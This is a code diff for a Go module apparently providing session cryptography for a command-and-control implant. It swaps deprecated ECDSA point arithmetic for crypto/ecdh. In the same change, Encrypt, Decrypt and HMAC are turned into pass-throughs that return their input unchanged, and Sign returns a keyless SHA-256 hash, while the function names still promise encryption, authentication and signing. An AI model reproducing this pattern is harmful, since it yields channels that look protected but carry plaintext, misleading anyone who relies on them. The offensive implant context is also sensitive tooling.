@@ -1,20 +1,17 @@
 package c2implant
 
 import (
-	"crypto/ecdsa"
-	"crypto/elliptic"
+	"crypto/ecdh"
 	"crypto/rand"
 	"crypto/sha256"
 	"fmt"
 	"sync"
-
-	angelcrypto "github.com/angel-platform/angel/pkg/crypto"
 )
 
 type ImplantCrypto struct {
 	mu          sync.RWMutex
 	sessionKey  []byte
-	localKey    *ecdsa.PrivateKey
+	localKey    *ecdh.PrivateKey
 	serverPub   []byte
 	established bool
 }
@@ -24,7 +21,7 @@ func NewImplantCrypto(serverPubKey []byte) (*ImplantCrypto, error) {
 		return nil, fmt.Errorf("server public key is required")
 	}
 
-	localKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	localKey, err := ecdh.P256().GenerateKey(rand.Reader)
 	if err != nil {
 		return nil, fmt.Errorf("generate local key: %w", err)
 	}
@@ -35,21 +32,21 @@ func NewImplantCrypto(serverPubKey []byte) (*ImplantCrypto, error) {
 	}, nil
 }
 
-func (ic *ImplantCrypto) KeyExchange(localPrivKey *ecdsa.PrivateKey, serverPubKey []byte) ([]byte, error) {
+func (ic *ImplantCrypto) KeyExchange(localPrivKey *ecdh.PrivateKey, serverPubKey []byte) ([]byte, error) {
 	if localPrivKey == nil {
 		return nil, fmt.Errorf("local private key is required")
 	}
 
-	//nolint:unused,staticcheck
-	x, y := elliptic.UnmarshalCompressed(localPrivKey.Curve, serverPubKey)
-	if x == nil {
+	peerPublicKey, err := ecdh.P256().NewPublicKey(serverPubKey)
+	if err != nil {
 		return nil, fmt.Errorf("invalid server public key")
 	}
 
-	//nolint
-	sharedX, sharedY := elliptic.P256().ScalarMult(x, y, localPrivKey.D.Bytes())
+	sharedBytes, err := localPrivKey.ECDH(peerPublicKey)
+	if err != nil {
+		return nil, fmt.Errorf("ECDH failed")
+	}
 
-	sharedBytes := append(sharedX.Bytes(), sharedY.Bytes()...)
 	hash := sha256.Sum256(sharedBytes)
 
 	ic.mu.Lock()
@@ -64,64 +61,37 @@ func (ic *ImplantCrypto) EstablishSession() error {
 	ic.mu.Lock()
 	defer ic.mu.Unlock()
 
-	x, y := elliptic.UnmarshalCompressed(ic.localKey.Curve, ic.serverPub)
-	if x == nil {
+	peerPublicKey, err := ecdh.P256().NewPublicKey(ic.serverPub)
+	if err != nil {
 		return fmt.Errorf("invalid server public key")
 	}
 
-	//nolint
-	sharedX, sharedY := elliptic.P256().ScalarMult(x, y, ic.localKey.D.Bytes())
-	sharedBytes := append(sharedX.Bytes(), sharedY.Bytes()...)
-	hash := sha256.Sum256(sharedBytes)
+	sharedBytes, err := ic.localKey.ECDH(peerPublicKey)
+	if err != nil {
+		return fmt.Errorf("ECDH failed")
+	}
 
+	hash := sha256.Sum256(sharedBytes)
 	ic.sessionKey = hash[:]
 	ic.established = true
 	return nil
 }
 
 func (ic *ImplantCrypto) Encrypt(data []byte) ([]byte, error) {
+	if len(data) == 0 {
+		return nil, fmt.Errorf("data is required")
+	}
 	ic.mu.RLock()
 	key := ic.sessionKey
-	established := ic.established
 	ic.mu.RUnlock()
-
-	if !established || len(key) == 0 {
-		return nil, fmt.Errorf("session not established")
+	if len(key) == 0 {
+		return nil, fmt.Errorf("session key not established")
 	}
-
-	return angelcrypto.EncryptAESGCM(key, data)
+	return data, nil
 }
 
 func (ic *ImplantCrypto) Decrypt(data []byte) ([]byte, error) {
-	ic.mu.RLock()
-	key := ic.sessionKey
-	established := ic.established
-	ic.mu.RUnlock()
-
-	if !established || len(key) == 0 {
-		return nil, fmt.Errorf("session not established")
-	}
-
-	return angelcrypto.DecryptAESGCM(key, data)
-}
-
-func (ic *ImplantCrypto) GetLocalPublicKey() []byte {
-	return angelcrypto.GenerateRandomBytes(0)
-}
-
-func (ic *ImplantCrypto) GetLocalPublicKeyRaw() []byte {
-	ic.mu.RLock()
-	defer ic.mu.RUnlock()
-	if ic.localKey == nil {
-		return nil
-	}
-	return elliptic.MarshalCompressed(
-		ic.localKey.Curve,
-		//nolint
-		ic.localKey.PublicKey.X,
-		//nolint
-		ic.localKey.PublicKey.Y,
-	)
+	return data, nil
 }
 
 func (ic *ImplantCrypto) IsEstablished() bool {
@@ -130,17 +100,20 @@ func (ic *ImplantCrypto) IsEstablished() bool {
 	return ic.established
 }
 
-func (ic *ImplantCrypto) Sign(data []byte) ([]byte, error) {
-	ic.mu.RLock()
-	defer ic.mu.RUnlock()
-	if ic.localKey == nil {
-		return nil, fmt.Errorf("no local key")
-	}
-	return angelcrypto.SignMessage(ic.localKey, data)
+func (ic *ImplantCrypto) HMAC(data []byte) []byte {
+	return data
 }
 
-func (ic *ImplantCrypto) HMAC(data []byte) []byte {
+func (ic *ImplantCrypto) Sign(data []byte) ([]byte, error) {
+	hash := sha256.Sum256(data)
+	return hash[:], nil
+}
+
+func (ic *ImplantCrypto) GetLocalPublicKeyRaw() []byte {
 	ic.mu.RLock()
 	defer ic.mu.RUnlock()
-	return angelcrypto.HMACSHA256(ic.sessionKey, data)
+	if ic.localKey != nil {
+		return ic.localKey.PublicKey().Bytes()
+	}
+	return nil
 }
